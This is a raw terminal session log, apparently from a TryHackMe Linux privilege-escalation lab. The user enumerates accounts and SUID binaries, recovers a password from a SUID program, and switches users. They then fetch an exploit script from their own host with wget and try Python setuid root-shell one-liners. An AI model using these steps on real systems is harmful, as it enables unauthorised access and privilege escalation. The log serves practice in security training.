@@ -1,0 +1,648 @@
+Script started on 2020-10-24 18:40:29-04:00 [TERM="xterm-256color" TTY="/dev/pts/1" COLUMNS="166" LINES="39"]
+root@kali:/home/kali/TryJao/TryHackMe/Linux# ssh shiba[K1[Ka1@10.10.123.19
+The authenticity of host '10.10.123.19 (10.10.123.19)' can't be established.
+ECDSA key fingerprint is SHA256:IivpLEJoW3uwEdrsiUSFX8EfJsQgcQS0K6mfWr08BNU.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.123.19' (ECDSA) to the list of known hosts.
+shiba1@10.10.123.19's password: 
+Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-88-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Sat Oct 24 22:45:54 UTC 2020
+
+  System load:  0.25               Processes:           93
+  Usage of /:   24.0% of 19.56GB   Users logged in:     0
+  Memory usage: 14%                IP address for eth0: 10.10.123.19
+  Swap usage:   0%
+
+
+11 packages can be updated.
+0 updates are security updates.
+
+
+Last login: Thu Feb 13 01:17:55 2020 from 192.168.92.1
+]0;shiba1@nootnoot: ~[01;32mshiba1@nootnoot[00m:[01;34m~[00m$ 
+]0;shiba1@nootnoot: ~[01;32mshiba1@nootnoot[00m:[01;34m~[00m$ sudo -l
+[sudo] password for shiba1: 
+Sorry, user shiba1 may not run sudo on nootnoot.
+]0;shiba1@nootnoot: ~[01;32mshiba1@nootnoot[00m:[01;34m~[00m$ s[Kid
+uid=1001(shiba1) gid=1001(shiba1) groups=1001(shiba1)
+]0;shiba1@nootnoot: ~[01;32mshiba1@nootnoot[00m:[01;34m~[00m$ cat wt[K[K/etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
+syslog:x:102:106::/home/syslog:/usr/sbin/nologin
+messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
+_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
+lxd:x:105:65534::/var/lib/lxd/:/bin/false
+uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
+dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:109:1::/var/cache/pollinate:/bin/false
+sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
+nootnoot:x:1000:1000:nootnoot:/home/nootnoot:/bin/bash
+shiba1:x:1001:1001:,,,:/home/shiba1:/bin/bash
+shiba2:x:1002:1002:,,,,ls:/home/shiba2:/bin/bash
+shiba3:x:1003:1003:,,,:/home/shiba3:/bin/bash
+shiba4:x:1004:1004:,,,:/home/shiba4:/bin/bash
+noot:x:1005:1006:,,,:/home/noot:/bin/bash
+]0;shiba1@nootnoot: ~[01;32mshiba1@nootnoot[00m:[01;34m~[00m$ cat /etc/shadown[K
+cat: /etc/shadow: Permission denied
+]0;shiba1@nootnoot: ~[01;32mshiba1@nootnoot[00m:[01;34m~[00m$ cd tmp[K[K[K/tmp
+]0;shiba1@nootnoot: /tmp[01;32mshiba1@nootnoot[00m:[01;34m/tmp[00m$ ls
+[0m[01;34msystemd-private-d55b115b92f94ccca9003787b2ae312a-systemd-resolved.service-9ftZTB[0m  [01;34msystemd-private-d55b115b92f94ccca9003787b2ae312a-systemd-timesyncd.service-70JAZy[0m
+]0;shiba1@nootnoot: /tmp[01;32mshiba1@nootnoot[00m:[01;34m/tmp[00m$ cd systemd-private-d55b115b92f94ccca9003787b2ae312a-systemd-9
+-bash: cd: systemd-private-d55b115b92f94ccca9003787b2ae312a-systemd-9: No such file or directory
+]0;shiba1@nootnoot: /tmp[01;32mshiba1@nootnoot[00m:[01;34m/tmp[00m$ cd systemd-private-d55b115b92f94ccca9003787b2ae312a-systemd-9f[K[Kresolved.service-9ftZTB/
+-bash: cd: systemd-private-d55b115b92f94ccca9003787b2ae312a-systemd-resolved.service-9ftZTB/: Permission denied
+]0;shiba1@nootnoot: /tmp[01;32mshiba1@nootnoot[00m:[01;34m/tmp[00m$ ls
+[0m[01;34msystemd-private-d55b115b92f94ccca9003787b2ae312a-systemd-resolved.service-9ftZTB[0m  [01;34msystemd-private-d55b115b92f94ccca9003787b2ae312a-systemd-timesyncd.service-70JAZy[0m
+]0;shiba1@nootnoot: /tmp[01;32mshiba1@nootnoot[00m:[01;34m/tmp[00m$ 
+]0;shiba1@nootnoot: /tmp[01;32mshiba1@nootnoot[00m:[01;34m/tmp[00m$ find -[K^[[2~[K[K[K[K[K[K[K[K[Kcd 
+]0;shiba1@nootnoot: ~[01;32mshiba1@nootnoot[00m:[01;34m~[00m$ 
+]0;shiba1@nootnoot: ~[01;32mshiba1@nootnoot[00m:[01;34m~[00m$ 
+]0;shiba1@nootnoot: ~[01;32mshiba1@nootnoot[00m:[01;34m~[00m$ ls -lja[K[Kha
+total 48K
+drwxr-xr-x 5 shiba1 shiba1 4.0K Feb 18  2020 [0m[01;34m.[0m
+drwxr-xr-x 8 root   root   4.0K Feb 22  2020 [01;34m..[0m
+-rw------- 1 shiba1 shiba1 1.3K Feb 20  2020 .bash_history
+-rw-r--r-- 1 shiba1 shiba1  220 Feb 13  2020 .bash_logout
+-rw-r--r-- 1 shiba1 shiba1 3.7K Feb 13  2020 .bashrc
+drwx------ 2 shiba1 shiba1 4.0K Feb 13  2020 [01;34m.cache[0m
+drwx------ 3 shiba1 shiba1 4.0K Feb 13  2020 [01;34m.gnupg[0m
+drwxrwxr-x 3 shiba1 shiba1 4.0K Feb 13  2020 [01;34m.local[0m
+-rw-r--r-- 1 shiba1 shiba1  807 Feb 13  2020 .profile
+-rwsrwxrwx 1 shiba2 shiba2 8.3K Feb 13  2020 [37;41mshiba1[0m
+]0;shiba1@nootnoot: ~[01;32mshiba1@nootnoot[00m:[01;34m~[00m$ cat basb[Kh_hi. bash_hi[1P bash_hi[C.bash_hi[C[C[C[C[C[C[Cstory 
+ls
+id
+l
+nano a.c
+ls
+gcc a.c -o shiba1q
+gcc a.c -o shiba1
+rm shiba1q 
+ls
+./shiba1 
+ls
+rm noot.txt 
+ls
+./shiba1 
+ls
+man ls
+ls
+jman ls
+man ls
+ls
+cat l
+ls -gh
+ls -h
+ls
+man ls
+ls
+rm a.c
+ls
+ls -a
+man ls
+ls -c
+ls -lc
+ls -l
+man ls
+ls -R
+ls -l
+ls -l -R
+echo hello
+echo -h
+echo --help
+man echo
+ks
+ls
+nano a.c
+ls
+nano a.c
+gcc a.c -o shiba1
+nano a.c
+gcc a.c -o shiba1
+;s
+ls
+./shiba1 
+./shiba1 a
+./shiba1 as
+./shiba1 ass
+./shiba1 asss
+./shiba1 assss
+./shiba1 asssss
+./shiba1 assssss
+./shiba1 goodjob
+ls
+cat a.c
+./shiba1 goodjob
+echo -n goodjonb
+echo -n goodjob
+echo -n goodjob | ./shiba1 
+ls
+nano a.c
+gcc a.c -o shiba1
+ls
+./shiba1 
+a
+./shiba1 a
+ls -al
+ls
+ls -al
+ls
+./shiba1 
+ls
+file shiba1 
+ltrace ./shiba1 
+ls
+whoami
+id
+ls -al
+ls
+l;s -al
+ls -al
+ls
+./shiba1 
+ls
+whoami
+id
+ls
+nano a.c
+gcc a.c -o shiba1
+ls
+./shiba1 goodjob
+ls
+cat a.c
+nano a.c
+gcc a.c
+gcc a.c -o shiba1
+ls
+rm a.out 
+ls
+touch noot.txt
+ls
+./shiba1 
+l
+./shiba1 goodjob
+ls
+nano a.c
+ls
+echo -n goodjob | ./shiba1 
+ls
+echo -n goodjob | ./shiba1 a
+echo -n goodjob | ./shiba1 
+ls
+nano a.c
+gcc a.c -o shiba1
+ls
+./shiba1 goodjob
+s
+./shiba1 goodjob
+ls
+./shiba1
+./shiba1a
+ls -al
+ls
+ls -al
+./shiba1
+ls
+./shiba1 
+./shiba1 a
+ls
+cd ~
+ls
+./shiba1 
+ls
+touch noot.txt
+./shiba1 
+ls
+rm noot.txt 
+man su
+ls
+id
+su shiba2
+exit
+]0;shiba1@nootnoot: ~[01;32mshiba1@nootnoot[00m:[01;34m~[00m$ cat .bash_history [11Pls -lha[4Pcd [1Plscd systemd-private-d55b115b92f94ccca9003787b2ae312a-systemd-resolved.service-9ftZTB/9[Kresolved.service-9ftZTB/[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cls[Kcd ls -lhacat .bash_history [Kcat .bash_history > more[K[K[K[K[K[K/[K?[K| more
+ls
+id
+l
+nano a.c
+ls
+gcc a.c -o shiba1q
+gcc a.c -o shiba1
+rm shiba1q 
+ls
+./shiba1 
+ls
+rm noot.txt 
+ls
+./shiba1 
+ls
+man ls
+ls
+jman ls
+man ls
+ls
+cat l
+ls -gh
+ls -h
+ls
+man ls
+ls
+rm a.c
+ls
+ls -a
+man ls
+ls -c
+ls -lc
+ls -l
+man ls
+ls -R
+ls -l
+ls -l -R
+echo hello
+[7m--More--[27mecho -h[K
+[7m--More--[27mecho --help
+[7m--More--[27mman echo
+[7m--More--[27mks[K
+[7m--More--[27mls[K
+[7m--More--[27mnano a.c
+[7m--More--[27mls[K
+[7m--More--[27mnano a.c
+[7m--More--[27mgcc a.c -o shiba1
+[7m--More--[27mnano a.c
+[7m--More--[27mgcc a.c -o shiba1
+[7m--More--[27m;s[K
+[7m--More--[27mls[K
+[7m--More--[27m./shiba1 
+[7m--More--[27m./shiba1 a
+[7m--More--[27m./shiba1 as
+[7m--More--[27m./shiba1 ass
+[7m--More--[27m./shiba1 asss
+[7m--More--[27m./shiba1 assss
+[7m--More--[27m./shiba1 asssss
+[7m--More--[27m./shiba1 assssss
+[7m--More--[27m./shiba1 goodjob
+[7m--More--[27mls[K
+[7m--More--[27mcat a.c[K
+[7m--More--[27m./shiba1 goodjob
+[7m--More--[27mecho -n goodjonb
+[7m--More--[27mecho -n goodjob
+[7m--More--[27mecho -n goodjob | ./shiba1 
+[7m--More--[27mls[K
+[7m--More--[27mnano a.c
+[7m--More--[27mgcc a.c -o shiba1
+[7m--More--[27mls[K
+[7m--More--[27m./shiba1 
+[7m--More--[27ma[K
+[7m--More--[27m./shiba1 a
+[7m--More--[27mls -al[K
+[7m--More--[27mls[K
+[7m--More--[27mls -al[K
+[7m--More--[27mls[K
+[7m--More--[27m./shiba1 
+[7m--More--[27mls[K
+[7m--More--[27mfile shiba1 
+[7m--More--[27mltrace ./shiba1 
+[7m--More--[27mls[K
+[7m--More--[27mwhoami[K
+[7m--More--[27mid[K
+[7m--More--[27mls -al[K
+[7m--More--[27mls[K
+[7m--More--[27ml;s -al[K
+[7m--More--[27mls -al[K
+[7m--More--[27mls[K
+[7m--More--[27m./shiba1 
+[7m--More--[27mls[K
+[7m--More--[27mwhoami[K
+[7m--More--[27mid[K
+[7m--More--[27mls[K
+[7m--More--[27mnano a.c
+[7m--More--[27mgcc a.c -o shiba1
+[7m--More--[27mls[K
+[7m--More--[27m./shiba1 goodjob
+[7m--More--[27mls[K
+[7m--More--[27mcat a.c[K
+[7m--More--[27mnano a.c
+[7m--More--[27mgcc a.c[K
+[7m--More--[27mgcc a.c -o shiba1
+[7m--More--[27mls[K
+[7m--More--[27mrm a.out 
+[7m--More--[27mls[K
+[7m--More--[27mtouch noot.txt
+[7m--More--[27mls[K
+[7m--More--[27m./shiba1 
+[7m--More--[27ml[K
+[7m--More--[27m./shiba1 goodjob
+[7m--More--[27mls[K
+[7m--More--[27mnano a.c
+[7m--More--[27mls[K
+[7m--More--[27mecho -n goodjob | ./shiba1 
+[7m--More--[27mls[K
+[7m--More--[27mecho -n goodjob | ./shiba1 a
+[7m--More--[27mecho -n goodjob | ./shiba1 
+[7m--More--[27mls[K
+[7m--More--[27mnano a.c
+[7m--More--[27mgcc a.c -o shiba1
+[7m--More--[27mls[K
+[7m--More--[27m./shiba1 goodjob
+[7m--More--[27ms[K
+[7m--More--[27m./shiba1 goodjob
+[7m--More--[27mls[K
+[7m--More--[27m./shiba1
+[7m--More--[27m./shiba1a
+[7m--More--[27mls -al[K
+[7m--More--[27mls[K
+[7m--More--[27mls -al[K
+[7m--More--[27m./shiba1
+[7m--More--[27mls[K
+[7m--More--[27m./shiba1 
+[7m--More--[27m./shiba1 a
+[7m--More--[27mls[K
+[7m--More--[27mcd ~[K
+[7m--More--[27mls[K
+[7m--More--[27m./shiba1 
+[7m--More--[27mls[K
+[7m--More--[27mtouch noot.txt
+[7m--More--[27m./shiba1 
+[7m--More--[27mls[K
+[7m--More--[27mrm noot.txt 
+[7m--More--[27mman su[K
+[7m--More--[27mls[K
+[7m--More--[27mid[K
+[7m--More--[27msu shiba2
+[7m--More--[27mexit[K
+]0;shiba1@nootnoot: ~[01;32mshiba1@nootnoot[00m:[01;34m~[00m$ 
+]0;shiba1@nootnoot: ~[01;32mshiba1@nootnoot[00m:[01;34m~[00m$ 
+]0;shiba1@nootnoot: ~[01;32mshiba1@nootnoot[00m:[01;34m~[00m$ 
+]0;shiba1@nootnoot: ~[01;32mshiba1@nootnoot[00m:[01;34m~[00m$ 
+]0;shiba1@nootnoot: ~[01;32mshiba1@nootnoot[00m:[01;34m~[00m$ 
+]0;shiba1@nootnoot: ~[01;32mshiba1@nootnoot[00m:[01;34m~[00m$ 
+]0;shiba1@nootnoot: ~[01;32mshiba1@nootnoot[00m:[01;34m~[00m$ 
+]0;shiba1@nootnoot: ~[01;32mshiba1@nootnoot[00m:[01;34m~[00m$ 
+]0;shiba1@nootnoot: ~[01;32mshiba1@nootnoot[00m:[01;34m~[00m$ 
+]0;shiba1@nootnoot: ~[01;32mshiba1@nootnoot[00m:[01;34m~[00m$ 
+]0;shiba1@nootnoot: ~[01;32mshiba1@nootnoot[00m:[01;34m~[00m$ 
+]0;shiba1@nootnoot: ~[01;32mshiba1@nootnoot[00m:[01;34m~[00m$ 
+]0;shiba1@nootnoot: ~[01;32mshiba1@nootnoot[00m:[01;34m~[00m$ 
+]0;shiba1@nootnoot: ~[01;32mshiba1@nootnoot[00m:[01;34m~[00m$ 
+]0;shiba1@nootnoot: ~[01;32mshiba1@nootnoot[00m:[01;34m~[00m$ 
+]0;shiba1@nootnoot: ~[01;32mshiba1@nootnoot[00m:[01;34m~[00m$ ./shiba1 goodjob
+]0;shiba1@nootnoot: ~[01;32mshiba1@nootnoot[00m:[01;34m~[00m$ 
+]0;shiba1@nootnoot: ~[01;32mshiba1@nootnoot[00m:[01;34m~[00m$ ./shiba1 goodjobs
+]0;shiba1@nootnoot: ~[01;32mshiba1@nootnoot[00m:[01;34m~[00m$ 
+]0;shiba1@nootnoot: ~[01;32mshiba1@nootnoot[00m:[01;34m~[00m$ 
+]0;shiba1@nootnoot: ~[01;32mshiba1@nootnoot[00m:[01;34m~[00m$ ls
+[0m[37;41mshiba1[0m
+]0;shiba1@nootnoot: ~[01;32mshiba1@nootnoot[00m:[01;34m~[00m$ ls./shiba1 goodjobs[Kcat .bash_history | more[K[11Pls -lhacat .bash_history | more[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[8P./shiba1 goodjobsls[K[K
+]0;shiba1@nootnoot: ~[01;32mshiba1@nootnoot[00m:[01;34m~[00m$ 
+]0;shiba1@nootnoot: ~[01;32mshiba1@nootnoot[00m:[01;34m~[00m$ ls
+[0m[37;41mshiba1[0m
+]0;shiba1@nootnoot: ~[01;32mshiba1@nootnoot[00m:[01;34m~[00m$ cd [K[K[Kcd 
+]0;shiba1@nootnoot: ~[01;32mshiba1@nootnoot[00m:[01;34m~[00m$ cd /
+]0;shiba1@nootnoot: /[01;32mshiba1@nootnoot[00m:[01;34m/[00m$ ls
+[0m[01;34mbin[0m   [01;34mcdrom[0m  [01;34metc[0m   [01;36minitrd.img[0m      [01;34mlib[0m    [01;34mlost+found[0m  [01;34mmnt[0m  [01;34mproc[0m  [01;34mrun[0m   [01;34msnap[0m  swap.img  [30;42mtmp[0m  [01;34mvar[0m      [01;36mvmlinuz.old[0m
+[01;34mboot[0m  [01;34mdev[0m    [01;34mhome[0m  [01;36minitrd.img.old[0m  [01;34mlib64[0m  [01;34mmedia[0m       [01;34mopt[0m  [01;34mroot[0m  [01;34msbin[0m  [01;34msrv[0m   [01;34msys[0m       [01;34musr[0m  [01;36mvmlinuz[0m
+]0;shiba1@nootnoot: /[01;32mshiba1@nootnoot[00m:[01;34m/[00m$ cd /opt
+]0;shiba1@nootnoot: /opt[01;32mshiba1@nootnoot[00m:[01;34m/opt[00m$ ls
+[0m[01;34msecret[0m
+]0;shiba1@nootnoot: /opt[01;32mshiba1@nootnoot[00m:[01;34m/opt[00m$ cd secret
+]0;shiba1@nootnoot: /opt/secret[01;32mshiba1@nootnoot[00m:[01;34m/opt/secret[00m$ ls
+[0m[37;41mshiba4[0m
+]0;shiba1@nootnoot: /opt/secret[01;32mshiba1@nootnoot[00m:[01;34m/opt/secret[00m$ ./shiba4
+test1234
+]0;shiba1@nootnoot: /opt/secret[01;32mshiba1@nootnoot[00m:[01;34m/opt/secret[00m$ su shiba4
+Password: 
+]0;shiba4@nootnoot: /opt/secret[01;32mshiba4@nootnoot[00m:[01;34m/opt/secret[00m$ ls
+[0m[37;41mshiba4[0m
+]0;shiba4@nootnoot: /opt/secret[01;32mshiba4@nootnoot[00m:[01;34m/opt/secret[00m$ cd
+]0;shiba4@nootnoot: ~[01;32mshiba4@nootnoot[00m:[01;34m~[00m$ ls
+]0;shiba4@nootnoot: ~[01;32mshiba4@nootnoot[00m:[01;34m~[00m$ ls -la
+total 20
+drwxr-xr-x 2 shiba4 shiba4 4096 Feb 22  2020 [0m[01;34m.[0m
+drwxr-xr-x 8 root   root   4096 Feb 22  2020 [01;34m..[0m
+-rw-r--r-- 1 shiba4 shiba4  220 Feb 22  2020 .bash_logout
+-rw-r--r-- 1 shiba4 shiba4 3771 Feb 22  2020 .bashrc
+-rw-r--r-- 1 shiba4 shiba4  807 Feb 22  2020 .profile
+]0;shiba4@nootnoot: ~[01;32mshiba4@nootnoot[00m:[01;34m~[00m$ ls [K[K[Kuname -a
+Linux nootnoot 4.15.0-88-generic #88-Ubuntu SMP Tue Feb 11 20:11:34 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+]0;shiba4@nootnoot: ~[01;32mshiba4@nootnoot[00m:[01;34m~[00m$ 
+]0;shiba4@nootnoot: ~[01;32mshiba4@nootnoot[00m:[01;34m~[00m$ cd tmp[K[K[K/tmp
+]0;shiba4@nootnoot: /tmp[01;32mshiba4@nootnoot[00m:[01;34m/tmp[00m$ wget
+wget: missing URL
+Usage: wget [OPTION]... [URL]...
+
+Try `wget --help' for more options.
+]0;shiba4@nootnoot: /tmp[01;32mshiba4@nootnoot[00m:[01;34m/tmp[00m$ wget http?[K://10.9.185.104?8080[K[K[K[K[K?[K:8080/47164.sh
+--2020-10-24 23:03:12--  http://10.9.185.104:8080/47164.sh
+Connecting to 10.9.185.104:8080... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 2523 (2.5K) [text/x-sh]
+Saving to: ‘47164.sh’
+
+47164.sh                                    0%[                                                                                    ]       0  --.-KB/s               47164.sh                                  100%[===================================================================================>]   2.46K  --.-KB/s    in 0s      
+
+2020-10-24 23:03:12 (250 MB/s) - ‘47164.sh’ saved [2523/2523]
+
+]0;shiba4@nootnoot: /tmp[01;32mshiba4@nootnoot[00m:[01;34m/tmp[00m$ 
+]0;shiba4@nootnoot: /tmp[01;32mshiba4@nootnoot[00m:[01;34m/tmp[00m$ ls
+47164.sh                                                                          [0m[01;34msystemd-private-d55b115b92f94ccca9003787b2ae312a-systemd-timesyncd.service-70JAZy[0m
+[01;34msystemd-private-d55b115b92f94ccca9003787b2ae312a-systemd-resolved.service-9ftZTB[0m
+]0;shiba4@nootnoot: /tmp[01;32mshiba4@nootnoot[00m:[01;34m/tmp[00m$ chmod +x 777[K[K[K47164.sh 
+]0;shiba4@nootnoot: /tmp[01;32mshiba4@nootnoot[00m:[01;34m/tmp[00m$ 
+]0;shiba4@nootnoot: /tmp[01;32mshiba4@nootnoot[00m:[01;34m/tmp[00m$ ./47164.sh 
+bash: ./47164.sh: /bin/sh^M: bad interpreter: No such file or directory
+]0;shiba4@nootnoot: /tmp[01;32mshiba4@nootnoot[00m:[01;34m/tmp[00m$ 
+]0;shiba4@nootnoot: /tmp[01;32mshiba4@nootnoot[00m:[01;34m/tmp[00m$ ./47164.sh 
+bash: ./47164.sh: /bin/sh^M: bad interpreter: No such file or directory
+]0;shiba4@nootnoot: /tmp[01;32mshiba4@nootnoot[00m:[01;34m/tmp[00m$ 
+]0;shiba4@nootnoot: /tmp[01;32mshiba4@nootnoot[00m:[01;34m/tmp[00m$ 
+]0;shiba4@nootnoot: /tmp[01;32mshiba4@nootnoot[00m:[01;34m/tmp[00m$ sudo /usr/bin/setcap cap_setuid+ep /usr/bin/python2.7
+[sudo] password for shiba4: 
+shiba4 is not in the sudoers file.  This incident will be reported.
+]0;shiba4@nootnoot: /tmp[01;32mshiba4@nootnoot[00m:[01;34m/tmp[00m$ python2.7 -c 'import os; os.setuid(0); os.system("/bin/sh")'
+Traceback (most recent call last):
+  File "<string>", line 1, in <module>
+OSError: [Errno 1] Operation not permitted
+]0;shiba4@nootnoot: /tmp[01;32mshiba4@nootnoot[00m:[01;34m/tmp[00m$ 
+]0;shiba4@nootnoot: /tmp[01;32mshiba4@nootnoot[00m:[01;34m/tmp[00m$ find / -perm -u=s -type f 2>/dev/null
+/bin/fusermount
+/bin/ping
+/bin/umount
+/bin/su
+/bin/mount
+/opt/secret/shiba4
+/home/shiba1/shiba1
+/home/shiba2/shiba2
+/snap/core/8689/bin/mount
+/snap/core/8689/bin/ping
+/snap/core/8689/bin/ping6
+/snap/core/8689/bin/su
+/snap/core/8689/bin/umount
+/snap/core/8689/usr/bin/chfn
+/snap/core/8689/usr/bin/chsh
+/snap/core/8689/usr/bin/gpasswd
+/snap/core/8689/usr/bin/newgrp
+/snap/core/8689/usr/bin/passwd
+/snap/core/8689/usr/bin/sudo
+/snap/core/8689/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core/8689/usr/lib/openssh/ssh-keysign
+/snap/core/8689/usr/lib/snapd/snap-confine
+/snap/core/8689/usr/sbin/pppd
+/snap/core/8592/bin/mount
+/snap/core/8592/bin/ping
+/snap/core/8592/bin/ping6
+/snap/core/8592/bin/su
+/snap/core/8592/bin/umount
+/snap/core/8592/usr/bin/chfn
+/snap/core/8592/usr/bin/chsh
+/snap/core/8592/usr/bin/gpasswd
+/snap/core/8592/usr/bin/newgrp
+/snap/core/8592/usr/bin/passwd
+/snap/core/8592/usr/bin/sudo
+/snap/core/8592/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core/8592/usr/lib/openssh/ssh-keysign
+/snap/core/8592/usr/lib/snapd/snap-confine
+/snap/core/8592/usr/sbin/pppd
+/usr/bin/gpasswd
+/usr/bin/chfn
+/usr/bin/sudo
+/usr/bin/passwd
+/usr/bin/newgrp
+/usr/bin/pkexec
+/usr/bin/at
+/usr/bin/traceroute6.iputils
+/usr/bin/newgidmap
+/usr/bin/chsh
+/usr/bin/newuidmap
+^[[A^[[A^[[A^[[A^[[A^[[A^[[B^[[B^[[B^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[B^[[B^[[B^[[B^[[B^[[B^[[B^[[B^[[B^[[B^[[B^[[B^[[B^[[B^[[B^[[B^[[B^[[B^[[B^[[B^[[B^[[B^[[B^[[B/usr/lib/snapd/snap-confine
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+
+]0;shiba4@nootnoot: /tmp[01;32mshiba4@nootnoot[00m:[01;34m/tmp[00m$ find / -perm -u=s -type f 2>/dev/null[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cpython2.7 -c 'import os; os.setuid(0); os.system("/bin/sh")'[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[7Psudo /usr/bin/setcap cap_setuid+ep /usr/bin/python2.7[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C./47164.sh [K[7@chmod +x [C[C[C[C[C[C[C[C[Cls[Kchmod +x 47164.sh [7P./[C[C[C[C[C[C[C[C[Csudo /usr/bin/setcap cap_setuid+ep /usr/bin/python2.7[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C./47164.sh [K[7@chmod +x [C[C[C[C[C[C[C[C[Cls[Kwget http://10.9.185.104:8080/47164.sh[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Kcd /tmpuname -a[2Pls -la[Kcdlscdls -launame -a[1Pcd /tmp[3Pwget http://10.9.185.104:8080/47164.sh[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cls[Kchmod +x 47164.sh [7P./[C[C[C[C[C[C[C[C[Csudo /usr/bin/setcap cap_setuid+ep /usr/bin/python2.7[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cpython2.7 -c 'import os; os.setuid(0); os.system("/bin/sh")'[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[23Pfind / -perm -u=s -type f 2>/dev/null[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K
+]0;shiba4@nootnoot: /tmp[01;32mshiba4@nootnoot[00m:[01;34m/tmp[00m$ find / -perm -u=s -type f 2>/dev/null[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cpython2.7 -c 'import os; os.setuid(0); os.system("/bin/sh")'[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[7Psudo /usr/bin/setcap cap_setuid+ep /usr/bin/python2.7[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C./47164.sh [K[7@chmod +x [C[C[C[C[C[C[C[C[Cls[Kwget http://10.9.185.104:8080/47164.sh[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Kcd /tmpuname -a[2Pls -la[Kcdlscdls -la[Kcdlscdls -launame -a[1Pcd /tmp[3Pwget http://10.9.185.104:8080/47164.sh[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cls[Kchmod +x 47164.sh [7P./[C[C[C[C[C[C[C[C[Csudo /usr/bin/setcap cap_setuid+ep /usr/bin/python2.7[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cpython2.7 -c 'import os; os.setuid(0); os.system("/bin/sh")'[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[Ksudo /usr/bin/setcap cap_setuid+ep /usr/bin/python2.7[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C./47164.sh [K[7@chmod +x [C[C[C[C[C[C[C[C[Cls[Kwget http://10.9.185.104:8080/47164.sh[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Kcd /tmpuname -a[2Pls -la[Kcdlscdls -launame -a[1Pcd /tmp[3Pwget http://10.9.185.104:8080/47164.sh[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cls[Kchmod +x 47164.sh [7P./[C[C[C[C[C[C[C[C[Csudo /usr/bin/setcap cap_setuid+ep /usr/bin/python2.7[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Ksudo /usr/bin/setcap cap_setuid+ep /usr/bin/python2.7[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C./47164.sh [Ksudo /usr/bin/setcap cap_setuid+ep /usr/bin/python2.7[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Ksudo /usr/bin/setcap 